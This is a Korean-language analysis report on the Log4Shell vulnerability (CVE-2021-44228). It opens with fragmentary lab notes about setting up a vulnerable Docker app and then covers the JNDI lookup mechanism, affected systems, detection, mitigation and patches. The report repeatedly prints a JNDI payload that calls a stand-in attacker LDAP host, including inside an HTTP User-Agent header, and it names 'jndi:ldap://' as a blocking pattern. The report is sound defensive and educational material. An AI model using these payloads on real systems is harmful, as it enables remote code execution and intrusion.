이글루코퍼레이션 원치현 Log4shell 분석보고서

# Log4shell
CVE-2021-44228
Log4j 아파치 재단의 무료오픈소스 java기반의 모든 애플가능 다양한 자바 기반 서비스 로그 기록 JDNI데이터및 객체를 발견 참고하기위한 자바 LDAP1389 Lookup JNDI를 통해 찾은 자원을 사용하는 기능

취약서버 구동 도커이미지파일 다운로드
Asudo git clone 
sudo docker build . -t vulnerable-app
새로 생성할 이미지를 vulnerable-app으로 현재 디렉토리에 도커 이미지 build 생성

github.com/welk

미사용 취약한 서버 종료
docker ps -a 실행중인 도커이미지 전체 확인
docker container 아이디 확인

# Log4Shell (CVE-2021-44228) 분석 보고서

## 1. 개요
**Log4Shell(CVE-2021-44228)**은 Apache Log4j 라이브러리에서 발견된 **원격 코드 실행(RCE, Remote Code Execution)** 취약점입니다.  
공격자는 악성 페이로드를 이용하여 **임의의 코드를 실행**할 수 있으며, 광범위한 피해를 초래할 수 있습니다.

본 보고서는 Log4Shell의 원리, 영향, 악용 사례, 탐지 및 대응 방법을 분석합니다.

---

## 2. 취약점 개요

| 항목 | 설명 |
|------|------|
| **취약점명** | Log4Shell |
| **CVE 번호** | CVE-2021-44228 |
| **취약점 유형** | 원격 코드 실행(RCE) |
| **영향을 받는 버전** | Log4j 2.0-beta9 ~ 2.14.1 |
| **패치된 버전** | Log4j 2.15.0 이상 |
| **공격 난이도** | 낮음 (간단한 문자열 입력만으로 악용 가능) |
| **심각도** | 🔥 치명적 (CVSS 10.0) |

---

## 3. 취약점 원리
Log4Shell은 **JNDI(Java Naming and Directory Interface) 룩업 기능의 취약점**을 이용하여 공격자가 원격 서버에서 악성 코드를 실행할 수 있도록 합니다.

### 3.1 공격 흐름
1. 공격자는 악성 문자열을 포함한 로그 메시지를 애플리케이션에 전달.
2. Log4j가 로그를 기록하는 과정에서 **JNDI Lookup을 실행**.
3. JNDI가 LDAP, RMI 등의 원격 서버에서 데이터를 조회.
4. 공격자의 서버에서 악성 Java 클래스 로드 및 실행.
5. **원격 코드 실행(RCE) 발생**.

### 3.2 공격 코드 예제
공격자는 다음과 같은 문자열을 로그에 남기기만 해도 취약점을 악용할 수 있습니다.

```java
${jndi:ldap://attacker.com:1389/exploit}
4. 영향 범위
Log4Shell 취약점은 Log4j를 사용하는 수많은 기업 및 서비스에 영향을 미쳤습니다.

4.1 취약한 주요 서비스 및 시스템
클라우드 서비스: AWS, Google Cloud, Microsoft Azure
기업 애플리케이션: Apache Struts, ElasticSearch, VMware vCenter
게임 서버: Minecraft, Steam
각종 웹 애플리케이션 및 서버: Spring Boot, Tomcat 등
5. 악용 사례 및 공격 예시
5.1 Minecraft 서버 공격
공격자는 Minecraft 채팅창에 다음 문자열을 입력하여 서버를 장악할 수 있었습니다.
shell
복사
편집
${jndi:ldap://attacker.com:1389/exploit}
서버가 이를 로그에 기록하면, JNDI Lookup을 통해 공격자의 서버에서 악성 코드가 실행됨.
5.2 웹 애플리케이션 공격
HTTP 요청의 User-Agent, Referer, X-Forwarded-For 등 로그에 기록되는 필드에 악성 페이로드를 삽입.
예제:
css
복사
편집
GET / HTTP/1.1
Host: victim.com
User-Agent: ${jndi:ldap://malicious.com:1389/exploit}
6. 탐지 및 대응 방안
6.1 취약점 탐지 방법
✅ 보안 스캐너 활용

log4j-scan (https://github.com/fullhunt/log4j-scan)
log4shell-detector (https://github.com/Neo23x0/log4shell-detector)
✅ 로그 파일 점검

로그에서 ${jndi:ldap://...} 같은 패턴이 발견되면 즉시 대응 필요.
✅ 네트워크 모니터링

비정상적인 LDAP, RMI 요청이 있는지 점검.
6.2 대응 방법
✅ 즉시 조치

Log4j 2.15.0 이상 버전으로 업그레이드.
Java 실행 시 환경 변수 설정:
shell
복사
편집
-Dlog4j2.formatMsgNoLookups=true
방화벽 및 IDS/IPS에서 jndi:ldap:// 패턴 차단.
✅ 장기적인 보안 조치

JNDI 사용 제한 및 보안 정책 강화.
WAF(Web Application Firewall) 적용.
주기적인 보안 점검 및 취약점 스캐닝 수행.
7. 패치 및 해결 방법
Log4j 버전	대응 조치
2.0-beta9 ~ 2.14.1	취약, 업데이트 필요
2.15.0	기본적으로 JNDI Lookup 비활성화
2.16.0	JNDI 기능 완전 제거
2.17.0	추가적인 보안 강화 조치
✅ 최신 버전(2.17.1 이상)으로 업데이트 권장!

8. 결론
Log4Shell(CVE-2021-44228)은 최근 몇 년간 가장 심각한 보안 취약점 중 하나로 평가됩니다.
✅ 취약한 시스템을 신속하게 패치하고, 지속적인 보안 모니터링을 수행하는 것이 필수적입니다.
✅ Log4j를 사용하는 모든 애플리케이션에서 보안 점검을 수행해야 합니다.

9. 참고 자료
Apache Log4j 공식 보안 권고문
NIST National Vulnerability Database (CVE-2021-44228)
log4j-scan (GitHub)

